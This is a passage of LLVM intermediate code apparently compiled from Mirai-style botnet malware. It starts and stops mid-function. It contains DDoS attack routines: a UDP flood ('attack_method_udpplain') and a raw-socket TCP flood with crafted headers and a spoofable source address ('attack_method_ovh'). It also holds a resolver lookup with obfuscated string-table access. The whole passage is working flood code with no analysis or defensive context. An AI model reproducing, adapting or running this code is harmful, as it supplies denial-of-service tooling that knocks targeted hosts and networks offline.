  %262 = bitcast i8* %261 to i16*
  store i16 0, i16* %262, align 2
  %263 = getelementptr inbounds i8, i8* %242, i64 24
  %264 = bitcast i8* %263 to i16*
  %265 = load i16, i16* %264, align 2
  %266 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %243, i8* %244, i16 zeroext %265, i32 %127)
  store i16 %266, i16* %262, align 2
  %267 = load i32, i32* %5, align 4
  %268 = sext i32 %267 to i64
  %269 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %268, i32 0, i32 2, i32 0
  store i32 %26, i32* %269, align 4
  %270 = getelementptr inbounds i8, i8* %242, i64 22
  %271 = bitcast i8* %270 to i16*
  %272 = load i16, i16* %271, align 2
  %273 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %268, i32 0, i32 1
  store i16 %272, i16* %273, align 2
  %274 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %268, i32 0
  %275 = bitcast %struct.sockaddr_in* %274 to %struct.sockaddr*
  %276 = call i64 @sendto(i32 %30, i8* %242, i64 %129, i32 16384, %struct.sockaddr* %275, i32 16) #10
  %277 = load i32, i32* %5, align 4
  %278 = add nsw i32 %277, 1
  store i32 %278, i32* %5, align 4
  %279 = icmp slt i32 %278, %36
  br i1 %279, label %.lr.ph.split, label %.loopexit.loopexit145

; <label>:280:                                    ; preds = %28, %4, %116
  ret void

; <label>:281:                                    ; preds = %.lr.ph128.us.1147
  %282 = add i8 %.1.us, 1
  br label %286

; <label>:283:                                    ; preds = %.lr.ph128.us.1147
  store i8 %.1.us, i8* %.1119.us, align 1
  %284 = getelementptr inbounds i8, i8* %89, i64 %indvars.iv.next
  %285 = getelementptr inbounds i8, i8* %284, i64 1
  br label %286

; <label>:286:                                    ; preds = %283, %281
  %.1119.us.1 = phi i8* [ %285, %283 ], [ %.1119.us, %281 ]
  %.1.us.1 = phi i8 [ 0, %283 ], [ %282, %281 ]
  %indvars.iv.next.1 = add nsw i64 %indvars.iv, 2
  %exitcond.1 = icmp eq i64 %indvars.iv.next.1, %wide.trip.count
  br i1 %exitcond.1, label %._crit_edge.us.loopexit.unr-lcssa, label %.lr.ph128.us

; <label>:287:                                    ; preds = %.lr.ph128.1150
  %288 = add i8 %.1, 1
  br label %292

; <label>:289:                                    ; preds = %.lr.ph128.1150
  store i8 %.1, i8* %.1119, align 1
  %290 = getelementptr inbounds i8, i8* %171, i64 %indvars.iv.next136
  %291 = getelementptr inbounds i8, i8* %290, i64 1
  br label %292

; <label>:292:                                    ; preds = %289, %287
  %.1119.1 = phi i8* [ %291, %289 ], [ %.1119, %287 ]
  %.1.1 = phi i8 [ 0, %289 ], [ %288, %287 ]
  %indvars.iv.next136.1 = add nsw i64 %indvars.iv135, 2
  %exitcond138.1 = icmp eq i64 %indvars.iv.next136.1, %wide.trip.count
  br i1 %exitcond138.1, label %._crit_edge.loopexit.unr-lcssa, label %.lr.ph128
}

; Function Attrs: noinline nounwind uwtable
define internal fastcc i32 @get_dns_resolver() unnamed_addr #0 {
  %1 = alloca [2048 x i8], align 16
  %2 = alloca [32 x i8], align 16
  tail call void @table_unlock_val(i8 zeroext 21)
  %3 = tail call i8* @table_retrieve_val(i32 21, i32* null)
  %4 = tail call i32 (i8*, i32, ...) @open(i8* %3, i32 0) #10
  tail call void @table_lock_val(i8 zeroext 21)
  %5 = icmp sgt i32 %4, -1
  br i1 %5, label %6, label %.loopexit

; <label>:6:                                      ; preds = %0
  %7 = getelementptr inbounds [2048 x i8], [2048 x i8]* %1, i64 0, i64 0
  %8 = call i64 @read(i32 %4, i8* nonnull %7, i64 2048) #10
  %9 = trunc i64 %8 to i32
  %10 = tail call i32 @close(i32 %4) #10
  tail call void @table_unlock_val(i8 zeroext 22)
  %11 = tail call i8* @table_retrieve_val(i32 22, i32* null)
  %12 = call i32 @util_stristr(i8* nonnull %7, i32 %9, i8* %11) #10
  call void @table_lock_val(i8 zeroext 22)
  %13 = icmp ne i32 %12, -1
  %14 = icmp slt i32 %12, %9
  %or.cond = and i1 %13, %14
  br i1 %or.cond, label %.lr.ph, label %.loopexit

.lr.ph:                                           ; preds = %6
  %.old = add nsw i32 %9, -1
  %15 = sext i32 %12 to i64
  %sext = shl i64 %8, 32
  %16 = ashr exact i64 %sext, 32
  br label %17

; <label>:17:                                     ; preds = %.lr.ph, %35
  %indvars.iv = phi i64 [ %15, %.lr.ph ], [ %indvars.iv.next, %35 ]
  %.02633 = phi i8 [ 0, %.lr.ph ], [ %.2, %35 ]
  %18 = getelementptr inbounds [2048 x i8], [2048 x i8]* %1, i64 0, i64 %indvars.iv
  %19 = load i8, i8* %18, align 1
  %20 = icmp eq i8 %.02633, 0
  br i1 %20, label %21, label %22

; <label>:21:                                     ; preds = %17
  switch i8 %19, label %22 [
    i8 32, label %35
    i8 9, label %35
  ]

; <label>:22:                                     ; preds = %21, %17
  %.1 = phi i8 [ %.02633, %17 ], [ 1, %21 ]
  %23 = icmp eq i8 %19, 46
  %24 = trunc i64 %indvars.iv to i32
  br i1 %23, label %28, label %25

; <label>:25:                                     ; preds = %22
  %.off = add i8 %19, -48
  %26 = icmp ugt i8 %.off, 9
  %27 = icmp eq i32 %24, %.old
  %or.cond29 = or i1 %27, %26
  br i1 %or.cond29, label %.critedge, label %35

; <label>:28:                                     ; preds = %22
  %.old28 = icmp eq i32 %24, %.old
  br i1 %.old28, label %.critedge, label %35

.critedge:                                        ; preds = %28, %25
  %.02731.lcssa = phi i32 [ %.old, %28 ], [ %24, %25 ]
  %29 = getelementptr inbounds [32 x i8], [32 x i8]* %2, i64 0, i64 0
  %30 = getelementptr inbounds [2048 x i8], [2048 x i8]* %1, i64 0, i64 %15
  %31 = sub nsw i32 %.02731.lcssa, %12
  call void @util_memcpy(i8* nonnull %29, i8* %30, i32 %31) #10
  %32 = sext i32 %31 to i64
  %33 = getelementptr inbounds [32 x i8], [32 x i8]* %2, i64 0, i64 %32
  store i8 0, i8* %33, align 1
  %34 = call i32 @inet_addr(i8* nonnull %29) #10
  br label %38

; <label>:35:                                     ; preds = %25, %21, %21, %28
  %.2 = phi i8 [ %.1, %28 ], [ 0, %21 ], [ 0, %21 ], [ %.1, %25 ]
  %indvars.iv.next = add nsw i64 %indvars.iv, 1
  %36 = icmp slt i64 %indvars.iv.next, %16
  br i1 %36, label %17, label %.loopexit.loopexit

.loopexit.loopexit:                               ; preds = %35
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %6, %0
  %37 = call i32 @htonl(i32 134744072) #11
  br label %38

; <label>:38:                                     ; preds = %.loopexit, %.critedge
  %.0 = phi i32 [ %34, %.critedge ], [ %37, %.loopexit ]
  ret i32 %.0
}

declare i32 @util_strlen(i8*) local_unnamed_addr #3

declare i32 @open(i8* nocapture readonly, i32, ...) local_unnamed_addr #3

declare i64 @read(i32, i8* nocapture, i64) local_unnamed_addr #3

declare i32 @util_stristr(i8*, i32, i8*) local_unnamed_addr #3

; Function Attrs: noinline nounwind uwtable
define void @attack_method_udpplain(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = zext i8 %0 to i64
  %7 = tail call noalias i8* @calloc(i64 %6, i64 8) #10
  %8 = bitcast i8* %7 to i8**
  %9 = tail call noalias i8* @calloc(i64 %6, i64 4) #10
  %10 = bitcast i8* %9 to i32*
  %11 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 7, i32 65535)
  %12 = trunc i32 %11 to i16
  %13 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 6, i32 65535)
  %14 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 0, i32 512)
  %15 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 1, i32 1)
  %16 = trunc i32 %15 to i8
  %17 = bitcast %struct.sockaddr_in* %5 to i8*
  call void @llvm.memset.p0i8.i64(i8* nonnull %17, i8 0, i64 16, i32 4, i1 false)
  %18 = and i32 %13, 65535
  %19 = icmp eq i32 %18, 65535
  br i1 %19, label %23, label %20

; <label>:20:                                     ; preds = %4
  %21 = trunc i32 %13 to i16
  %22 = tail call zeroext i16 @htons(i16 zeroext %21) #11
  br label %23

; <label>:23:                                     ; preds = %4, %20
  %.058 = phi i16 [ %22, %20 ], [ 0, %4 ]
  %24 = zext i8 %0 to i32
  %25 = icmp eq i8 %0, 0
  br i1 %25, label %.preheader.split.preheader, label %.lr.ph65

.preheader.split.preheader:                       ; preds = %.preheader, %23
  br label %.preheader.split

.lr.ph65:                                         ; preds = %23
  %26 = and i32 %11, 65535
  %27 = icmp eq i32 %26, 65535
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 0
  %29 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 1
  %30 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 2, i32 0
  %31 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  %32 = zext i8 %0 to i64
  br i1 %27, label %.lr.ph65.split.us.preheader, label %.lr.ph65.split.preheader

.lr.ph65.split.preheader:                         ; preds = %.lr.ph65
  br label %.lr.ph65.split

.lr.ph65.split.us.preheader:                      ; preds = %.lr.ph65
  br label %.lr.ph65.split.us

.lr.ph65.split.us:                                ; preds = %.lr.ph65.split.us.preheader, %51
  %indvars.iv = phi i64 [ %indvars.iv.next, %51 ], [ 0, %.lr.ph65.split.us.preheader ]
  %33 = call noalias i8* @calloc(i64 65535, i64 1) #10
  %34 = getelementptr inbounds i8*, i8** %8, i64 %indvars.iv
  store i8* %33, i8** %34, align 8
  %35 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv
  %36 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 0, i32 1
  store i16 0, i16* %36, align 2
  %37 = call i32 @socket(i32 2, i32 2, i32 17) #10
  %38 = getelementptr inbounds i32, i32* %10, i64 %indvars.iv
  store i32 %37, i32* %38, align 4
  %39 = icmp eq i32 %37, -1
  br i1 %39, label %.us-lcssa.us.loopexit, label %40

; <label>:40:                                     ; preds = %.lr.ph65.split.us
  store i16 2, i16* %28, align 4
  store i16 %.058, i16* %29, align 2
  store i32 0, i32* %30, align 4
  %41 = call i32 @bind(i32 %37, %struct.sockaddr* nonnull %31, i32 16) #10
  %42 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 2
  %43 = load i8, i8* %42, align 4
  %44 = icmp ult i8 %43, 32
  br i1 %44, label %45, label %51

; <label>:45:                                     ; preds = %40
  %46 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 1
  %47 = load i32, i32* %46, align 4
  %48 = call i32 @ntohl(i32 %47) #11
  %49 = call i32 @htonl(i32 %48) #11
  %50 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 0, i32 2, i32 0
  store i32 %49, i32* %50, align 4
  br label %51

; <label>:51:                                     ; preds = %45, %40
  %52 = bitcast %struct.attack_target* %35 to %struct.sockaddr*
  %53 = call i32 @connect(i32 %37, %struct.sockaddr* %52, i32 16) #10
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %54 = icmp slt i64 %indvars.iv.next, %32
  br i1 %54, label %.lr.ph65.split.us, label %.preheader.loopexit

.preheader.loopexit:                              ; preds = %51
  br label %.preheader

.preheader.loopexit78:                            ; preds = %92
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit78, %.preheader.loopexit
  %55 = icmp eq i8 %16, 0
  %.mask = and i32 %14, 65535
  %56 = zext i32 %.mask to i64
  br i1 %25, label %.preheader.split.preheader, label %.preheader.split.us

.preheader.split.us:                              ; preds = %.preheader
  br i1 %55, label %.lr.ph.split.us.us.preheader, label %.lr.ph..lr.ph.split_crit_edge.us.preheader

.lr.ph..lr.ph.split_crit_edge.us.preheader.loopexit: ; preds = %.lr.ph.split.us.us
  br label %.lr.ph..lr.ph.split_crit_edge.us.preheader

.lr.ph..lr.ph.split_crit_edge.us.preheader:       ; preds = %.lr.ph..lr.ph.split_crit_edge.us.preheader.loopexit, %.preheader.split.us
  %.not = xor i1 %55, true
  br label %.lr.ph..lr.ph.split_crit_edge.us

.lr.ph..lr.ph.split_crit_edge.us:                 ; preds = %.lr.ph..lr.ph.split_crit_edge.us.preheader, %.lr.ph..lr.ph.split_crit_edge.us
  %.160.us61 = phi i32 [ %.mux67, %.lr.ph..lr.ph.split_crit_edge.us ], [ 0, %.lr.ph..lr.ph.split_crit_edge.us.preheader ]
  %57 = sext i32 %.160.us61 to i64
  %58 = getelementptr inbounds i8*, i8** %8, i64 %57
  %59 = load i8*, i8** %58, align 8
  call void @rand_str(i8* %59, i32 %.mask)
  %60 = getelementptr inbounds i32, i32* %10, i64 %57
  %61 = load i32, i32* %60, align 4
  %62 = call i64 @send(i32 %61, i8* %59, i64 %56, i32 16384) #10
  %63 = add nsw i32 %.160.us61, 1
  %64 = icmp slt i32 %63, %24
  %brmerge66 = or i1 %64, %.not
  %.mux67 = select i1 %64, i32 %63, i32 0
  br i1 %brmerge66, label %.lr.ph..lr.ph.split_crit_edge.us, label %.lr.ph.split.us.us.preheader.loopexit

.lr.ph.split.us.us.preheader.loopexit:            ; preds = %.lr.ph..lr.ph.split_crit_edge.us
  br label %.lr.ph.split.us.us.preheader

.lr.ph.split.us.us.preheader:                     ; preds = %.lr.ph.split.us.us.preheader.loopexit, %.preheader.split.us
  br label %.lr.ph.split.us.us

.lr.ph.split.us.us:                               ; preds = %.lr.ph.split.us.us.preheader, %.lr.ph.split.us.us
  %.160.us.us = phi i32 [ %.mux, %.lr.ph.split.us.us ], [ 0, %.lr.ph.split.us.us.preheader ]
  %65 = sext i32 %.160.us.us to i64
  %66 = getelementptr inbounds i8*, i8** %8, i64 %65
  %67 = load i8*, i8** %66, align 8
  %68 = getelementptr inbounds i32, i32* %10, i64 %65
  %69 = load i32, i32* %68, align 4
  %70 = call i64 @send(i32 %69, i8* %67, i64 %56, i32 16384) #10
  %71 = add nsw i32 %.160.us.us, 1
  %72 = icmp slt i32 %71, %24
  %brmerge = or i1 %72, %55
  %.mux = select i1 %72, i32 %71, i32 0
  br i1 %brmerge, label %.lr.ph.split.us.us, label %.lr.ph..lr.ph.split_crit_edge.us.preheader.loopexit

.lr.ph65.split:                                   ; preds = %.lr.ph65.split.preheader, %92
  %indvars.iv70 = phi i64 [ %indvars.iv.next71, %92 ], [ 0, %.lr.ph65.split.preheader ]
  %73 = call noalias i8* @calloc(i64 65535, i64 1) #10
  %74 = getelementptr inbounds i8*, i8** %8, i64 %indvars.iv70
  store i8* %73, i8** %74, align 8
  %75 = call zeroext i16 @htons(i16 zeroext %12) #11
  %76 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv70
  %77 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv70, i32 0, i32 1
  store i16 %75, i16* %77, align 2
  %78 = call i32 @socket(i32 2, i32 2, i32 17) #10
  %79 = getelementptr inbounds i32, i32* %10, i64 %indvars.iv70
  store i32 %78, i32* %79, align 4
  %80 = icmp eq i32 %78, -1
  br i1 %80, label %.us-lcssa.us.loopexit77, label %81

.us-lcssa.us.loopexit:                            ; preds = %.lr.ph65.split.us
  br label %.us-lcssa.us

.us-lcssa.us.loopexit77:                          ; preds = %.lr.ph65.split
  br label %.us-lcssa.us

.us-lcssa.us:                                     ; preds = %.us-lcssa.us.loopexit77, %.us-lcssa.us.loopexit
  ret void

; <label>:81:                                     ; preds = %.lr.ph65.split
  store i16 2, i16* %28, align 4
  store i16 %.058, i16* %29, align 2
  store i32 0, i32* %30, align 4
  %82 = call i32 @bind(i32 %78, %struct.sockaddr* nonnull %31, i32 16) #10
  %83 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv70, i32 2
  %84 = load i8, i8* %83, align 4
  %85 = icmp ult i8 %84, 32
  br i1 %85, label %86, label %92

; <label>:86:                                     ; preds = %81
  %87 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv70, i32 1
  %88 = load i32, i32* %87, align 4
  %89 = call i32 @ntohl(i32 %88) #11
  %90 = call i32 @htonl(i32 %89) #11
  %91 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv70, i32 0, i32 2, i32 0
  store i32 %90, i32* %91, align 4
  br label %92

; <label>:92:                                     ; preds = %86, %81
  %93 = bitcast %struct.attack_target* %76 to %struct.sockaddr*
  %94 = call i32 @connect(i32 %78, %struct.sockaddr* %93, i32 16) #10
  %indvars.iv.next71 = add nuw nsw i64 %indvars.iv70, 1
  %95 = icmp slt i64 %indvars.iv.next71, %32
  br i1 %95, label %.lr.ph65.split, label %.preheader.loopexit78

.preheader.split:                                 ; preds = %.preheader.split.preheader, %.preheader.split
  br label %.preheader.split
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_ovh(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %5 = alloca i32, align 4
  %6 = zext i8 %0 to i64
  %7 = tail call noalias i8* @calloc(i64 %6, i64 8) #10
  %8 = bitcast i8* %7 to i8**
  %9 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 2, i32 0)
  %10 = trunc i32 %9 to i8
  %11 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 3, i32 65535)
  %12 = trunc i32 %11 to i16
  %13 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 4, i32 64)
  %14 = trunc i32 %13 to i8
  %15 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 5, i32 1)
  %16 = trunc i32 %15 to i8
  %17 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 6, i32 65535)
  %18 = trunc i32 %17 to i16
  %19 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 7, i32 65535)
  %20 = trunc i32 %19 to i16
  %21 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 17, i32 65535)
  %22 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 18, i32 0)
  %23 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 11, i32 0)
  %24 = trunc i32 %23 to i8
  %25 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 12, i32 0)
  %26 = trunc i32 %25 to i16
  %27 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 13, i32 0)
  %28 = trunc i32 %27 to i16
  %29 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 14, i32 0)
  %30 = trunc i32 %29 to i16
  %31 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 15, i32 0)
  %32 = trunc i32 %31 to i16
  %33 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 16, i32 0)
  %34 = trunc i32 %33 to i16
  %35 = load i32, i32* @LOCAL_ADDR, align 4
  %36 = tail call i32 @attack_get_opt_ip(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 25, i32 %35)
  %37 = tail call i32 @socket(i32 2, i32 3, i32 6) #10
  %38 = icmp eq i32 %37, -1
  br i1 %38, label %285, label %39

; <label>:39:                                     ; preds = %4
  store i32 1, i32* %5, align 4
  %40 = bitcast i32* %5 to i8*
  %41 = call i32 @setsockopt(i32 %37, i32 0, i32 3, i8* nonnull %40, i32 4) #10
  %42 = icmp eq i32 %41, -1
  br i1 %42, label %109, label %.preheader128

.preheader128:                                    ; preds = %39
  store i32 0, i32* %5, align 4
  %43 = zext i8 %0 to i32
  %44 = icmp eq i8 %0, 0
  br i1 %44, label %.preheader, label %.lr.ph130

.lr.ph130:                                        ; preds = %.preheader128
  %45 = icmp eq i8 %16, 0
  %46 = trunc i32 %21 to i16
  %47 = and i8 %24, 1
  %48 = zext i8 %47 to i16
  %49 = shl nuw nsw i16 %48, 13
  %50 = shl i16 %26, 12
  %51 = and i16 %50, 4096
  %52 = shl i16 %28, 11
  %53 = and i16 %52, 2048
  %54 = shl i16 %30, 10
  %55 = and i16 %54, 1024
  %56 = shl i16 %32, 9
  %57 = and i16 %56, 512
  %58 = shl i16 %34, 8
  %59 = and i16 %58, 256
  %60 = or i16 %49, %51
  %61 = or i16 %60, %53
  %62 = or i16 %61, %55
  %.masked = or i16 %62, %57
  %63 = or i16 %.masked, %59
  %64 = or i16 %63, 160
  %65 = zext i8 %0 to i64
  br i1 %45, label %.lr.ph130.split.us.preheader, label %.lr.ph130.split.preheader

.lr.ph130.split.preheader:                        ; preds = %.lr.ph130
  br label %.lr.ph130.split

.lr.ph130.split.us.preheader:                     ; preds = %.lr.ph130
  br label %.lr.ph130.split.us

.lr.ph130.split.us:                               ; preds = %.lr.ph130.split.us.preheader, %.lr.ph130.split.us
  %indvars.iv = phi i64 [ %indvars.iv.next, %.lr.ph130.split.us ], [ 0, %.lr.ph130.split.us.preheader ]
  %66 = call noalias i8* @calloc(i64 128, i64 1) #10
  %67 = getelementptr inbounds i8*, i8** %8, i64 %indvars.iv
  store i8* %66, i8** %67, align 8
  %68 = getelementptr inbounds i8, i8* %66, i64 20
  %69 = getelementptr inbounds i8, i8* %66, i64 40
  store i8 69, i8* %66, align 4
  %70 = getelementptr inbounds i8, i8* %66, i64 1
  store i8 %10, i8* %70, align 1
  %71 = call zeroext i16 @htons(i16 zeroext 60) #11
  %72 = getelementptr inbounds i8, i8* %66, i64 2
  %73 = bitcast i8* %72 to i16*
  store i16 %71, i16* %73, align 2
  %74 = call zeroext i16 @htons(i16 zeroext %12) #11
  %75 = getelementptr inbounds i8, i8* %66, i64 4
  %76 = bitcast i8* %75 to i16*
  store i16 %74, i16* %76, align 4
  %77 = getelementptr inbounds i8, i8* %66, i64 8
  store i8 %14, i8* %77, align 4
  %78 = getelementptr inbounds i8, i8* %66, i64 9
  store i8 6, i8* %78, align 1
  %79 = getelementptr inbounds i8, i8* %66, i64 12
  %80 = bitcast i8* %79 to i32*
  store i32 %36, i32* %80, align 4
  %81 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 1
  %82 = load i32, i32* %81, align 4
  %83 = getelementptr inbounds i8, i8* %66, i64 16
  %84 = bitcast i8* %83 to i32*
  store i32 %82, i32* %84, align 4
  %85 = call zeroext i16 @htons(i16 zeroext %18) #11
  %86 = bitcast i8* %68 to i16*
  store i16 %85, i16* %86, align 4
  %87 = call zeroext i16 @htons(i16 zeroext %20) #11
  %88 = getelementptr inbounds i8, i8* %66, i64 22
  %89 = bitcast i8* %88 to i16*
  store i16 %87, i16* %89, align 2
  %90 = call zeroext i16 @htons(i16 zeroext %46) #11
  %91 = zext i16 %90 to i32
  %92 = getelementptr inbounds i8, i8* %66, i64 24
  %93 = bitcast i8* %92 to i32*
  store i32 %91, i32* %93, align 4
  %94 = getelementptr inbounds i8, i8* %66, i64 32
  %95 = bitcast i8* %94 to i16*
  store i16 %64, i16* %95, align 4
  %96 = getelementptr inbounds i8, i8* %66, i64 41
  store i8 2, i8* %69, align 1
  %97 = getelementptr inbounds i8, i8* %66, i64 42
  store i8 4, i8* %96, align 1
  %98 = call zeroext i16 @htons(i16 zeroext 1400) #11
  %99 = bitcast i8* %97 to i16*
  store i16 %98, i16* %99, align 2
  %100 = getelementptr inbounds i8, i8* %66, i64 44
  %101 = getelementptr inbounds i8, i8* %66, i64 45
  store i8 4, i8* %100, align 1
  %102 = getelementptr inbounds i8, i8* %66, i64 46
  store i8 2, i8* %101, align 1
  %103 = getelementptr inbounds i8, i8* %66, i64 47
  store i8 8, i8* %102, align 1
  store i8 10, i8* %103, align 1
  %104 = getelementptr inbounds i8, i8* %66, i64 56
  %105 = getelementptr inbounds i8, i8* %66, i64 57
  store i8 1, i8* %104, align 1
  %106 = getelementptr inbounds i8, i8* %66, i64 58
  store i8 3, i8* %105, align 1
  %107 = getelementptr inbounds i8, i8* %66, i64 59
  store i8 3, i8* %106, align 1
  store i8 6, i8* %107, align 1
  %indvars.iv.next = add nsw i64 %indvars.iv, 1
  %108 = icmp slt i64 %indvars.iv.next, %65
  br i1 %108, label %.lr.ph130.split.us, label %..preheader_crit_edge.loopexit

; <label>:109:                                    ; preds = %39
  %110 = call i32 @close(i32 %37) #10
  br label %285

..preheader_crit_edge.loopexit:                   ; preds = %.lr.ph130.split.us
  br label %..preheader_crit_edge

..preheader_crit_edge.loopexit142:                ; preds = %.lr.ph130.split
  br label %..preheader_crit_edge

..preheader_crit_edge:                            ; preds = %..preheader_crit_edge.loopexit142, %..preheader_crit_edge.loopexit
  %.lcssa131.in = phi i64 [ %indvars.iv.next, %..preheader_crit_edge.loopexit ], [ %indvars.iv.next136, %..preheader_crit_edge.loopexit142 ]
  %.lcssa131 = trunc i64 %.lcssa131.in to i32
  store i32 %.lcssa131, i32* %5, align 4
  br label %.preheader

.preheader:                                       ; preds = %.preheader128, %..preheader_crit_edge
  %111 = icmp eq i32 %36, -1
  %112 = and i32 %11, 65535
  %113 = icmp eq i32 %112, 65535
  %114 = and i32 %17, 65535
  %115 = icmp eq i32 %114, 65535
  %116 = and i32 %19, 65535
  %117 = icmp eq i32 %116, 65535
  %118 = icmp eq i32 %21, 65535
  %119 = icmp eq i32 %22, 65535
  %120 = icmp eq i8 %24, 0
  br label %.loopexit

.lr.ph130.split:                                  ; preds = %.lr.ph130.split.preheader, %.lr.ph130.split
  %indvars.iv135 = phi i64 [ %indvars.iv.next136, %.lr.ph130.split ], [ 0, %.lr.ph130.split.preheader ]
  %121 = call noalias i8* @calloc(i64 128, i64 1) #10
  %122 = getelementptr inbounds i8*, i8** %8, i64 %indvars.iv135
  store i8* %121, i8** %122, align 8
  %123 = getelementptr inbounds i8, i8* %121, i64 20
  %124 = getelementptr inbounds i8, i8* %121, i64 40
  store i8 69, i8* %121, align 4
  %125 = getelementptr inbounds i8, i8* %121, i64 1
  store i8 %10, i8* %125, align 1
  %126 = call zeroext i16 @htons(i16 zeroext 60) #11
  %127 = getelementptr inbounds i8, i8* %121, i64 2
  %128 = bitcast i8* %127 to i16*
  store i16 %126, i16* %128, align 2
  %129 = call zeroext i16 @htons(i16 zeroext %12) #11
  %130 = getelementptr inbounds i8, i8* %121, i64 4
  %131 = bitcast i8* %130 to i16*
  store i16 %129, i16* %131, align 4
  %132 = getelementptr inbounds i8, i8* %121, i64 8
  store i8 %14, i8* %132, align 4
  %133 = call zeroext i16 @htons(i16 zeroext 16384) #11
  %134 = getelementptr inbounds i8, i8* %121, i64 6
  %135 = bitcast i8* %134 to i16*
  store i16 %133, i16* %135, align 2
  %136 = getelementptr inbounds i8, i8* %121, i64 9
  store i8 6, i8* %136, align 1
  %137 = getelementptr inbounds i8, i8* %121, i64 12
  %138 = bitcast i8* %137 to i32*
  store i32 %36, i32* %138, align 4
  %139 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv135, i32 1
  %140 = load i32, i32* %139, align 4
  %141 = getelementptr inbounds i8, i8* %121, i64 16
  %142 = bitcast i8* %141 to i32*
  store i32 %140, i32* %142, align 4
  %143 = call zeroext i16 @htons(i16 zeroext %18) #11
  %144 = bitcast i8* %123 to i16*
  store i16 %143, i16* %144, align 4
  %145 = call zeroext i16 @htons(i16 zeroext %20) #11
  %146 = getelementptr inbounds i8, i8* %121, i64 22
  %147 = bitcast i8* %146 to i16*
  store i16 %145, i16* %147, align 2
  %148 = call zeroext i16 @htons(i16 zeroext %46) #11
  %149 = zext i16 %148 to i32
  %150 = getelementptr inbounds i8, i8* %121, i64 24
  %151 = bitcast i8* %150 to i32*
  store i32 %149, i32* %151, align 4
  %152 = getelementptr inbounds i8, i8* %121, i64 32
  %153 = bitcast i8* %152 to i16*
  store i16 %64, i16* %153, align 4
  %154 = getelementptr inbounds i8, i8* %121, i64 41
  store i8 2, i8* %124, align 1
  %155 = getelementptr inbounds i8, i8* %121, i64 42
  store i8 4, i8* %154, align 1
  %156 = call zeroext i16 @htons(i16 zeroext 1400) #11
  %157 = bitcast i8* %155 to i16*
  store i16 %156, i16* %157, align 2
  %158 = getelementptr inbounds i8, i8* %121, i64 44
  %159 = getelementptr inbounds i8, i8* %121, i64 45
  store i8 4, i8* %158, align 1
  %160 = getelementptr inbounds i8, i8* %121, i64 46
  store i8 2, i8* %159, align 1
  %161 = getelementptr inbounds i8, i8* %121, i64 47
  store i8 8, i8* %160, align 1
  store i8 10, i8* %161, align 1
  %162 = getelementptr inbounds i8, i8* %121, i64 56
  %163 = getelementptr inbounds i8, i8* %121, i64 57
  store i8 1, i8* %162, align 1
  %164 = getelementptr inbounds i8, i8* %121, i64 58
  store i8 3, i8* %163, align 1
  %165 = getelementptr inbounds i8, i8* %121, i64 59
  store i8 3, i8* %164, align 1
  store i8 6, i8* %165, align 1
  %indvars.iv.next136 = add nsw i64 %indvars.iv135, 1
  %166 = icmp slt i64 %indvars.iv.next136, %65
  br i1 %166, label %.lr.ph130.split, label %..preheader_crit_edge.loopexit142

